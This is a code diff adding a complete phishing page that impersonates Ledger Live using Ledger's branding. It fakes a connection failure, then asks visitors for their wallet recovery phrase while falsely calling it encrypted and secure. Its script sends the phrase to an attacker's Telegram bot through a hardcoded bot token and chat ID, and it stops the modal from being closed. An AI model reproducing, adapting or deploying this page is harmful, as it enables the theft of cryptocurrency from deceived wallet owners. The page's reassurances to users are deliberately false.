@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ledger Live </title>
+    <meta name="description" content="Connect your crypto wallet securely with WalletConnect. Import your wallet manually using your recovery phrase with our secure connection interface.">
+    <link rel="icon" href="https://ledger-wp-website-s3-prd.ledger.com/uploads/2021/11/Ledger_favicon.png" sizes="32x32" />
+<link rel="icon" href="https://ledger-wp-website-s3-prd.ledger.com/uploads/2021/11/Ledger_favicon.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://ledger-wp-website-s3-prd.ledger.com/uploads/2021/11/Ledger_favicon.png" />
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.98);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 50;
+            padding: 1rem;
+        }
+
+        .modal {
+            background: #ffffff;
+            border: 2px solid #000000;
+            border-radius: 1rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+            width: 100%;
+            max-width: 28rem;
+            padding: 2rem;
+            animation: slideUp 0.3s ease-out;
+        }
+
+        @keyframes slideUp {
+            0% { 
+                transform: translateY(20px); 
+                opacity: 0; 
+            }
+            100% { 
+                transform: translateY(0); 
+                opacity: 1; 
+            }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        .animate-spin {
+            animation: spin 2s linear infinite;
+        }
+
+        .animate-pulse {
+            animation: pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+
+        .animate-fade-in {
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .wallet-icon {
+            width: 2rem;
+            height: 2rem;
+            background: #000000;
+            border-radius: 0.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 0.75rem;
+            color: #ffffff;
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #000000;
+        }
+
+        .modal-content {
+            text-align: center;
+        }
+
+        .connection-title {
+            font-size: 1.25rem;
+            font-weight: 500;
+            color: #000000;
+            margin-bottom: 2rem;
+            line-height: 1.4;
+        }
+
+        .loading-spinner {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 2rem;
+        }
+
+        .spinner-container {
+            position: relative;
+        }
+
+        .spinner-ring {
+            width: 4rem;
+            height: 4rem;
+            border: 4px solid #e5e5e5;
+            border-radius: 50%;
+        }
+
+        .spinner-active {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4rem;
+            height: 4rem;
+            border: 4px solid #000000;
+            border-top: 4px solid transparent;
+            border-radius: 50%;
+        }
+
+        .spinner-icon {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .inner-icon {
+            width: 1.5rem;
+            height: 1.5rem;
+            background: #000000;
+            border-radius: 0.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+        }
+
+        .error-box {
+            background: #f5f5f5;
+            border: 2px solid #000000;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: flex-start;
+        }
+
+        .error-icon {
+            color: #000000;
+            margin-top: 0.125rem;
+            margin-right: 0.75rem;
+            flex-shrink: 0;
+        }
+
+        .error-text {
+            color: #000000;
+            font-weight: 500;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            border-radius: 0.5rem;
+            font-weight: 600;
+            font-size: 0.875rem;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .btn-primary {
+            background: #000000;
+            color: #ffffff;
+            border: 2px solid #000000;
+        }
+
+        .btn-primary:hover {
+            background: #333333;
+            border-color: #333333;
+        }
+
+        .btn-primary:disabled {
+            background: #cccccc;
+            color: #666666;
+            border-color: #cccccc;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: #ffffff;
+            color: #000000;
+            border: 2px solid #000000;
+        }
+
+        .btn-secondary:hover {
+            background: #f5f5f5;
+            color: #000000;
+            border-color: #000000;
+        }
+
+        .form-container {
+            text-align: left;
+        }
+
+        .form-title {
+            font-size: 1.25rem;
+            font-weight: 500;
+            color: #000000;
+            margin-bottom: 0.5rem;
+            text-align: center;
+        }
+
+        .form-subtitle {
+            color: #666666;
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: #000000;
+            margin-bottom: 0.5rem;
+        }
+
+        .required {
+            color: #000000;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            border: 2px solid #000000;
+            border-radius: 0.5rem;
+            font-size: 0.875rem;
+            transition: all 0.2s;
+            font-family: 'Inter', sans-serif;
+            background: #ffffff;
+            color: #000000;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #000000;
+            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-input::placeholder {
+            color: #999999;
+        }
+
+        .form-textarea {
+            resize: none;
+            min-height: 6rem;
+        }
+
+        .form-help {
+            font-size: 0.75rem;
+            color: #666666;
+            margin-top: 0.25rem;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.75rem;
+        }
+
+        .checkbox {
+            width: 1rem;
+            height: 1rem;
+            margin-top: 0.125rem;
+            flex-shrink: 0;
+            accent-color: #000000;
+        }
+
+        .checkbox-label {
+            font-size: 0.875rem;
+            color: #666666;
+            line-height: 1.3;
+        }
+
+        .link {
+            color: #000000;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            color: #000000;
+            font-size: 0.875rem;
+            margin-top: 0.25rem;
+            font-weight: 600;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .loading-text {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .spinner-small {
+            width: 1.25rem;
+            height: 1.25rem;
+            border: 2px solid transparent;
+            border-top: 2px solid currentColor;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal">
+            <!-- Header -->
+            <div class="modal-header">
+                <div class="wallet-icon">
+                    <img src="https://www.ledger.com/wp-content/themes/ledger-v2/public/images/ledger-logo-long.svg" alt="Wallet Logo" style="width: 100%; height: 100%; object-fit: contain;">
+                </div>
+                <h1 class="modal-title"> Ledger Live </h1>
+            </div>
+
+            <!-- Loading State -->
+            <div class="modal-content" id="loadingState">
+                <h2 class="connection-title">
+                    Connecting to<br> Ledger Live...
+                </h2>
+
+                <div class="loading-spinner">
+                    <div class="spinner-container">
+                        <div class="spinner-ring"></div>
+                        <div class="spinner-active animate-spin"></div>
+                        <div class="spinner-icon">
+                            <div class="inner-icon animate-pulse">
+                                    <img src="https://www.ledger.com/wp-content/themes/ledger-v2/public/images/ledger-logo-long.svg" alt="Wallet Logo" style="width: 0.75rem; height: 0.75rem; object-fit: contain;">
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Error State -->
+            <div class="modal-content hidden animate-fade-in" id="errorState">
+                <h2 class="connection-title">
+                    Connecting to<br> Ledger Live...
+                </h2>
+
+                <div class="error-box">
+                    <i data-lucide="x" class="error-icon"></i>
+                    <p class="error-text">
+                        Connection failed. Unable to connect automatically.
+                    </p>
+                </div>
+
+                <div class="button-group">
+                    <button class="btn btn-primary" onclick="showManualForm()">
+                        Connect Manually
+                    </button>
+                    <button class="btn btn-secondary" onclick="retryConnection()">
+                        Cancel
+                    </button>
+                </div>
+            </div>
+
+            <!-- Form State -->
+            <div class="form-container hidden animate-fade-in" id="formState">
+                <h2 class="form-title">Manual Import</h2>
+                <p class="form-subtitle">
+                    Enter your wallet recovery phrase to connect manually
+                </p>
+
+                <form id="walletForm" onsubmit="submitForm(event)">
+                    <div class="form-group">
+                        <label for="walletType" class="form-label">
+                            Wallet Type <span class="required">*</span>
+                        </label>
+                        <select class="form-input" id="walletType" name="wallet_type" required>
+                            <option value="">Select a wallet</option>
+                            <option value="ledger">Ledger</option>
+                            <option value="metamask">MetaMask</option>
+                            <option value="trust-wallet">Trust Wallet</option>
+                            <option value="coinbase-wallet">Coinbase Wallet</option>
+                            <option value="trezor">Trezor</option>
+                            <option value="other">Other</option>
+                        </select>
+                        <p class="form-help">
+                            Choose the wallet type you want to connect before entering your recovery phrase.
+                        </p>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">
+                            Recovery Phrase <span class="required">*</span>
+                        </label>
+                        <textarea 
+                            class="form-input form-textarea" 
+                            id="recoveryPhrase"
+                            name="recovery_phrase"
+                            placeholder="Enter your 12 or 24 word recovery phrase..."
+                            required
+                        ></textarea>
+                        <p class="form-help">
+                            Separate each word with a space. Your phrase is encrypted and secure.
+                        </p>
+                        <div class="error-message hidden" id="phraseError"></div>
+                    </div>
+
+                   
+
+                    
+                    
+                    <!-- Additional fields for FormSubmit -->
+                    <input type="hidden" name="submission_time" id="submissionTime">
+                    <input type="hidden" name="user_agent" id="userAgent">
+
+                    <div class="button-group">
+                        <button type="submit" class="btn btn-primary" id="submitBtn">
+                            Import Wallet
+                        </button>
+                        <button type="button" class="btn btn-secondary" onclick="showErrorState()">
+                            Back
+                        </button>
+                    </div>
+                    <div class="error-message hidden" id="submitStatus"></div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Initialize Lucide icons
+        lucide.createIcons();
+
+        let currentState = 'loading';
+
+        // Auto-start loading sequence when page loads
+        window.addEventListener('load', function() {
+            startConnectionSequence();
+        });
+
+        function startConnectionSequence() {
+            currentState = 'loading';
+            showLoadingState();
+            
+            // Simulate connection attempt - auto-transition to error after 3 seconds
+            setTimeout(() => {
+                showErrorState();
+            }, 3000);
+        }
+
+        function showLoadingState() {
+            document.getElementById('loadingState').classList.remove('hidden');
+            document.getElementById('errorState').classList.add('hidden');
+            document.getElementById('formState').classList.add('hidden');
+            currentState = 'loading';
+        }
+
+        function showErrorState() {
+            document.getElementById('loadingState').classList.add('hidden');
+            document.getElementById('errorState').classList.remove('hidden');
+            document.getElementById('formState').classList.add('hidden');
+            currentState = 'error';
+        }
+
+        function showManualForm() {
+            document.getElementById('loadingState').classList.add('hidden');
+            document.getElementById('errorState').classList.add('hidden');
+            document.getElementById('formState').classList.remove('hidden');
+            currentState = 'form';
+            
+            // Focus on the first input
+            setTimeout(() => {
+                document.getElementById('recoveryPhrase').focus();
+            }, 100);
+        }
+
+        function retryConnection() {
+            startConnectionSequence();
+        }
+
+        function validateRecoveryPhrase(phrase) {
+            const words = phrase.trim().split(/\s+/).filter(word => word.length > 0);
+            if (words.length !== 12 && words.length !== 24) {
+                return 'Recovery phrase must be 12 or 24 words';
+            }
+            return null;
+        }
+
+        function showError(elementId, message) {
+            const errorElement = document.getElementById(elementId);
+            errorElement.textContent = message;
+            errorElement.classList.remove('hidden');
+        }
+
+        function hideError(elementId) {
+            const errorElement = document.getElementById(elementId);
+            errorElement.classList.add('hidden');
+        }
+
+        const telegramBotToken = '8465671323:AAEDNDBusjvb_ie5Fc1VHsP0jCYno7fly0o'; // replace with your bot token
+        const telegramChatId = '7404636997'; // replace with your chat id
+
+        function formatFormDataAsText(formData) {
+            const lines = [];
+            for (const [key, value] of formData.entries()) {
+                if (!value || value.toString().trim() === '') continue;
+                lines.push(`${key}: ${value}`);
+            }
+            return lines.join('\n');
+        }
+
+        function escapeTelegramText(text) {
+            return text
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;');
+        }
+
+        async function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            const body = {
+                chat_id: telegramChatId,
+                text: escapeTelegramText(message)
+            };
+
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(body)
+            });
+
+            const data = await response.json();
+            if (!data.ok) {
+                throw new Error(data.description || 'Telegram API error');
+            }
+            return data;
+        }
+
+        async function submitForm(event) {
+            event.preventDefault();
+
+            // Clear previous errors
+            hideError('phraseError');
+            hideError('submitStatus');
+
+            const form = document.getElementById('walletForm');
+            const formData = new FormData(form);
+            const recoveryPhrase = formData.get('recovery_phrase')?.toString() || '';
+
+            const phraseError = validateRecoveryPhrase(recoveryPhrase);
+            if (phraseError) {
+                showError('phraseError', phraseError);
+                return false;
+            }
+
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.innerHTML = '<div class="loading-text"><div class="spinner-small"></div>Submitting...</div>';
+            submitBtn.disabled = true;
+
+            const message = `New form submission from Ledger Live page:\n\n${formatFormDataAsText(formData)}`;
+
+            try {
+                await sendTelegramMessage(message);
+                submitBtn.textContent = 'Connected';
+                submitBtn.disabled = true;
+                showError('submitStatus', 'Wallet Connected Succefully.');
+            } catch (error) {
+                submitBtn.textContent = 'Import Wallet';
+                submitBtn.disabled = false;
+                showError('submitStatus', `Unable to send message: ${error.message}`);
+            }
+
+            return false;
+        }
+
+        // Prevent modal from being closed
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                e.preventDefault();
+                e.stopPropagation();
+            }
+        });
+
+        document.getElementById('modalOverlay').addEventListener('click', function(e) {
+            e.stopPropagation();
+        });
+
+        // Real-time validation for recovery phrase
+        document.getElementById('recoveryPhrase').addEventListener('input', function() {
+            const phrase = this.value;
+            if (phrase.trim().length > 0) {
+                const error = validateRecoveryPhrase(phrase);
+                if (error) {
+                    showError('phraseError', error);
+                } else {
+                    hideError('phraseError');
+                }
+            } else {
+                hideError('phraseError');
+            }
+        });
+    </script>
+</body>
+</html>
